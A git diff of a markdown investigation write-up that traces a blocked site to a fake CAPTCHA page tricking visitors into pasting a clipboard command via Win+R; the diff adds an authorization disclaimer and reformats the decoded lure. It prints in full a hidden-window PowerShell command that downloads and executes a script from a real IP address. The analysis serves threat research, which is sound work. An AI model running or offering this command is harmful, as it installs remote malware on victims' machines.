@@ -1,5 +1,7 @@
 # Dead Site to C2 Server Discovery - 20260314
 
+### **This investigation was authorized by the higher-ups at my company. No further threat hunting or red teaming followed after discovery of the C2 server.**
+
 Last month I was asked to look into a site that got blocked by an internet provider.<br>
 The site, "dkaksdaksortor[.]com" was dead upon access. So I was tasked to figure out what was on this site that caused it to be blocked.
 
@@ -59,8 +61,7 @@ In the second image we get an idea of what happens when we click the checkbox.<b
 First we get an error for "Unusual Web Traffic Detected" so we need you do the following 3 steps of pressing "Win +R" and copy and pasting whatever command is on your clipboard.<br>
 At the very bottom we see a code for your computer auto copying on click and at the top of that image we have the variable copyCommand to equal a base64. This base64 we found at the very top our Burp results.<br>
 Let's decode that.<br>
-Base64: cG93ZXJzaGVsbCAtd2kgbWkgLUVQIEIgLWMgaWV4KGlybSAxOTMuMTExLjExNy4yMjYvVi5HUkUp<br>
-Decoded: powershell -wi mi -EP B -c iex(irm 193.111.117.226/V.GRE)
+Decoded: `powershell -wi mi -EP B -c iex(irm 193.111.117.226/V.GRE)`
 
 Let's dissect that.<br>
 ・launches powershell<br>
